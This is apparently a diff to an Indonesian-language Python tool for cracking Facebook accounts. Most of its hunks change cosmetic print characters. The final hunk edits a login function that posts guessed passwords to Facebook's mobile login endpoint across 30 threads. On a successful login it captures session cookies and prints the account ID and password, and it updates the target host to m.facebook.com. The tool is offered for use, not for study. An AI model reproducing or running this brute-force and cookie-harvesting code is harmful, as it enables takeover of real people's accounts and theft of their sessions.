@@ -291,11 +291,11 @@ def menu():
         lolol_id=lolo['id']
         link = lolo['link']
     except (KeyError,IOError):
-        print(f"{B} | ")
-        print(f"{B} | ")
+        print(f"{B} • ")
+        print(f"{B} • ")
         jalan(f"{P}[!]{M} cookie failed.");log_cookie()
     os.system("clear");banner()
-    print(f"{B} | ")
+    print(f"{B} • ")
     jalan(f"{P}[*] NAMA AKUN    : {B}{lolol}") 
     print(f"{P}[*] USER ID      : {B}{lolol_id}")
     print(f"{P}[*] URL FACEBOOK : {B}{link}")
@@ -627,7 +627,7 @@ def fii_xd():
 	print(f"{B} • ")
 	fiisayangwidiya =input(f"{P}[•] Pilih : {B}")
 	if fiisayangwidiya in [""]:
-		print(f"{B} | ")
+		print(f"{B} • ")
 		print(f"{P}[•]{M} Pilihan tidak boleh kosong");exit()
 	elif fiisayangwidiya in ["1","01"]:
 		print(f"{P}[•] Tampilan kan opsi akun chek point {B}Y/t")
@@ -639,19 +639,19 @@ def fii_xd():
 				_key = "anjink"
 				key = "anjink" #----- jangan di ubah
 				if _key in key:
-					print(f"{B} | ")
+					print(f"{B} • ")
 					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
-					print(f"{B} | ")
+					print(f"{B} • ")
 					ter =input(f"{P}[•] Pilih : {B}")
 					if ter in ["m","M"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
-							print(f"{B} | ")
-							print(f"{B} | ")
+							print(f"{B} • ")
+							print(f"{B} • ")
 							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
-							print(f"{B} | ")
+							print(f"{B} • ")
 							asu = input(f"{P}[•] Buat sandi : {B}").split(",")
 							if len(asu) =="":
-								print(f"{B} | ")
+								print(f"{B} • ")
 								print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
 							started()
 							for user in id:
@@ -684,14 +684,14 @@ def fii_xd():
 			ter =input(f"{P}[•] Pilih : {B}")
 			if ter in ["m","M"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
-					print(f"{B} | ")
-					print(f"{B} | ")
+					print(f"{B} • ")
+					print(f"{B} • ")
 					print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
-					print(f"{B} | ")
+					print(f"{B} • ")
 					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
 					if len(asu) =="":
-						print(f"{B} | ")
-						print(f"{B} | ")
+						print(f"{B} • ")
+						print(f"{B} • ")
 						print(f"{P}[•]{M} Sandi tidak boleh kosong")
 					started()
 					for user in id:
@@ -728,17 +728,17 @@ def fii_xd():
 				_key = "Anjink"
 				key = "Anjink"
 				if _key in key:
-					print(f"{B} | ")
-					print(f"{B} | ")
+					print(f"{B} • ")
+					print(f"{B} • ")
 					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
-					print(f"{B} | ")
+					print(f"{B} • ")
 					ter =input(f"{P}[•] Pilih : {B}")
 					if ter in ["m","M"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
-							print(f"{B} | ")
-							print(f"{B} | ")
+							print(f"{B} • ")
+							print(f"{B} • ")
 							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
-							print(f"{B} | ")
+							print(f"{B} • ")
 							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
 							if len(asu) =="":
 								print(f"{B} | ")
@@ -768,21 +768,21 @@ def fii_xd():
 			except (KeyError,IOError):print(f"{_key}");exit()
 
 		else:
-			print(f"{B} | ")
-			print(f"{B} | ")
+			print(f"{B} • ")
+			print(f"{B} • ")
 			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
-			print(f"{B} | ")
+			print(f"{B} • ")
 			ter =input(f"{P}[•] Pilih : {B}")
 			if ter in ["m","M"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
-					print(f"{B} | ")
-					print(f"{B} | ")
+					print(f"{B} • ")
+					print(f"{B} • ")
 					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
-					print(f"{B} | ")
+					print(f"{B} • ")
 					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
 					if len(asu) =="":
-						print(f"{B} | ")
-						print(f"{B} | ")
+						print(f"{B} • ")
+						print(f"{B} • ")
 						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
 					started()
 					for user in id:
@@ -807,31 +807,31 @@ def fii_xd():
 				exit()
 				
 	elif fiisayangwidiya in ["2","02"]:
-		print(f"{B} | ")
-		print(f"{B} | ")
+		print(f"{B} • ")
+		print(f"{B} • ")
 		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
 		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
-		print(f"{B} | ")
+		print(f"{B} • ")
 		_checkoptions_=input(f"{P}[•] Pilih : {B}")
 		if _checkoptions_ in ["y","Y"]:
 			try:
 				_key = "Anjink"
 				key = "Anjink"
 				if _key in key:
-					print(f"{B} | ")
-					print(f"{B} | ")
+					print(f"{B} • ")
+					print(f"{B} • ")
 					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
-					print(f"{B} | ")
+					print(f"{B} • ")
 					ter =input(f"{P}[•] Pilih : {B}")
 					if ter in ["m","M"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
-							print(f"{B} | ")
-							print(f"{B} | ")
+							print(f"{B} • ")
+							print(f"{B} • ")
 							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
-							print(f"{B} | ")
+							print(f"{B} • ")
 							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
 							if len(asu) =="":
-								print(f"{B} | ")
+								print(f"{B} • ")
 								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
 							started()
 							for user in id:
@@ -858,21 +858,21 @@ def fii_xd():
 			except (KeyError,IOError):print(f"{_key}");exit()
 
 		else:
-			print(f"{B} | ")
-			print(f"{B} | ")
+			print(f"{B} • ")
+			print(f"{B} • ")
 			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
-			print(f"{B} | ")
+			print(f"{B} • ")
 			ter =input(f"{P}[•] Pilih : {B}")
 			if ter in ["m","M"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
-					print(f"{B} | ")
-					print(f"{B} | ")
+					print(f"{B} • ")
+					print(f"{B} • ")
 					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
-					print(f"{B} | ")
+					print(f"{B} • ")
 					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
 					if len(asu) =="":
-						print(f"{B} | ")
-						print(f"{B} | ")
+						print(f"{B} • ")
+						print(f"{B} • ")
 						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
 					started()
 					for user in id:
@@ -897,20 +897,20 @@ def fii_xd():
 				exit()
 				
 def kone():
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     print(f"{P}[1] B-api >>>> {B}Fast")
     print(f"{P}[2] Mbasic >>>> {B}Low")
     print(f"{P}[3] Mobile >>>> {B}Very low")
 
 def started():
-    print(f"{B} | ")
-    print(f"{B} | ")
+    print(f"{B} • ")
+    print(f"{B} • ")
     print(f"{P}[•]{B} Results {I}ok {B}tersimpan di {I}ok/{tanggal}")
     print(f"{P}[•]{B} Results {K}cp {B}tersimpan di {K}cp/{tanggal}")
-    print(f"{B} | ")
+    print(f"{B} • ")
     print(f"{P}[•] Mode pesawat 5 detik jika tidak ada hasil")
-    print(f"{B} | {P}")
+    print(f"{B} • {P}")
 
 def api(uid, fii):
     try:
@@ -1118,8 +1118,8 @@ def mobil(uid, fii):
 		fii_gtg = {}
 		pw = pw.lower()
 		ses = requests.Session()
-		ses.headers.update({"origin": "https://mobile.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
-		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
+		ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+		p = ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8").text
 		b = parser(p,"html.parser")
 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 		for i in b("input"):
@@ -1128,7 +1128,7 @@ def mobil(uid, fii):
 				else:continue
 			except:pass
 		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
-		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
+		deku = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 			print(f"\r{B} |----> {I}{uid}•{pw}")
